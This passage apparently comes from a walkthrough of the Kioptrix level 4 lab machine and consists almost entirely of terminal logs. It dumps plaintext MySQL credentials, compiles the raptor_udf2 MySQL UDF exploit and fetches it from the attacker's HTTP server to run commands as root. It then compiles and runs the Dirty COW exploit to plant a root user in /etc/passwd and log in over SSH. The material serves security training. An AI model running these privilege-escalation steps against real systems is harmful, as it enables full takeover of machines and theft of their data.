Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| members            |
| mysql              |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; show tables from members;
+-------------------+
| Tables_in_members |
+-------------------+
| members           |
+-------------------+
1 row in set (0.00 sec)

mysql&gt; use members
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          |
|  2 | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
2 rows in set (0.00 sec)

mysql&gt; exit

robert@Kioptrix4:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04.3 LTS
Release:        8.04
Codename:       hardy

robert@Kioptrix4:~$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

robert@Kioptrix4:~$ ps aux | grep mysql
root  4825  0.0  0.0   1772   528 ?        S    11:14   0:00 /bin/sh /usr/bin/mysqld_safe
root  4867  0.0  1.5 126988 16340 ?        Sl   11:14   0:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-ext
root  4869  0.0  0.0   1700   560 ?        S    11:14   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld



root@kali:~/kioptrix/level4/UDF# searchsploit -m exploits/linux/local/1518.c
  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
      URL: https://www.exploit-db.com/exploits/1518
     Path: /usr/share/exploitdb/exploits/linux/local/1518.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/kioptrix/level4/UDF/1518.c


root@kali:~/kioptrix/level4/UDF#
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c^C
root@kali:~/kioptrix/level4/UDF# mv 1518.c raptor_udf2.c
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c
root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
root@kali:~/kioptrix/level4/UDF# ls -la
total 40
drwxr-xr-x 2 root root  4096 Jan  4 22:23 .
drwxr-xr-x 4 root root  4096 Jan  4 22:21 ..
-rw-r--r-- 1 root root  3378 Jan  4 22:22 raptor_udf2.c
-rw-r--r-- 1 root root  7232 Jan  4 22:23 raptor_udf2.o
-rwxr-xr-x 1 root root 19120 Jan  4 22:23 raptor_udf2.so
root@kali:~/kioptrix/level4/UDF# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so
--15:15:28--  http://192.168.88.128:8000/raptor_udf2.so
           =&gt; `raptor_udf2.so`
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19,120 (19K) [application/octet-stream]

100%[==========================================================================================================================================&gt;] 19,120        --.--K/s

15:15:28 (164.09 MB/s) - `raptor_udf2.so' saved [19120/19120]

robert@Kioptrix4:~$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql&gt; insert into foo values(load_file('/home/robert/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)

mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 22 raptor_udf2.so: wrong ELF class: ELFCLASS64)



^C
Keyboard interrupt received, exiting.
root@kali:~/kioptrix/level4/UDF# ls
raptor_udf2.c  raptor_udf2.o  raptor_udf2.so
root@kali:~/kioptrix/level4/UDF# mkdir 64
root@kali:~/kioptrix/level4/UDF# mv * 64
mv: cannot move '64' to a subdirectory of itself, '64/64'
root@kali:~/kioptrix/level4/UDF# cp 64/raptor_udf2.c .
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c -m32
root@kali:~/kioptrix/level4/UDF# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32
root@kali:~/kioptrix/level4/UDF# python3 -m http.server

robert@Kioptrix4:~$ rm raptor_udf2.so
robert@Kioptrix4:~$ wget http://192.168.88.128:8000/raptor_udf2.so
--15:20:13--  http://192.168.88.128:8000/raptor_udf2.so
           =&gt; `raptor_udf2.so'
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17,944 (18K) [application/octet-stream]

100%[==========================================================================================================================================&gt;] 17,944        --.--K/s

15:20:13 (23.32 MB/s) - `raptor_udf2.so' saved [17944/17944]

robert@Kioptrix4:~$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 40
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; drop table foo;
Query OK, 0 rows affected (0.00 sec)

mysql&gt; create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql&gt; insert into foo values(load_file('/home/robert/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
ERROR 1086 (HY000): File '/usr/lib/raptor_udf2.so' already exists
mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2_32.so';
Query OK, 1 row affected (0.00 sec)

mysql&gt; create function do_system returns integer soname 'raptor_udf2_32.so';
Query OK, 0 rows affected (0.01 sec)

mysql&gt; select * from mysql.func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
| sys_exec              |   0 | lib_mysqludf_sys.so | function |
| do_system             |   2 | raptor_udf2_32.so   | function |
+-----------------------+-----+---------------------+----------+
3 rows in set (0.00 sec)

mysql&gt; select do_system('id &gt; /tmp/out; chown robert.robert /tmp/out');
+----------------------------------------------------------+
| do_system('id &gt; /tmp/out; chown robert.robert /tmp/out') |
+----------------------------------------------------------+
|                                               8589934592 |
+----------------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; \! bash
robert@Kioptrix4:~$ cat /tmp/out
uid=0(root) gid=0(root)
</code></pre><pre><code class=language-bash>root@kali:~/kioptrix/level4/dirtycow# gcc -pthread dirty.c -o dirty -lcrypt -m32
root@kali:~/kioptrix/level4/dirtycow# python3 -m http.server


robert@Kioptrix4:~$ wget http://192.168.88.128:8000/dirty
--14:47:51--  http://192.168.88.128:8000/dirty
           =&gt; `dirty'
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16,744 (16K) [application/octet-stream]

100%[==========================================================================================================================================&gt;] 16,744        --.--K/s

14:47:51 (20.38 MB/s) - `dirty' saved [16744/16744]

robert@Kioptrix4:~$ chmod +x dirty
robert@Kioptrix4:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b7fa5000


root@kali:~# ssh firefart@192.168.88.132
firefart@192.168.88.132's password:
Failed to add entry for user firefart.

Welcome to LigGoat Security Systems - We are Watching
firefart@Kioptrix4:~# id
uid=0(firefart) gid=0(root) groups=0(root)
</code></pre><footer class=footline></footer></div></div><div id=navigation></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js></script><script src=/js/perfect-scrollbar.min.js></script><script src=/js/perfect-scrollbar.jquery.min.js></script><script src=/js/jquery.sticky.js></script><script src=/js/featherlight.min.js></script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script><script src=/js/modernizr.custom-3.6.0.js></script><script src=/js/learn.js></script><script src=/js/hugo-learn.js></script><link href=/mermaid/mermaid.css rel=stylesheet><script src=/mermaid/mermaid.js></script><script>mermaid.initialize({startOnLoad:true});</script></body></html>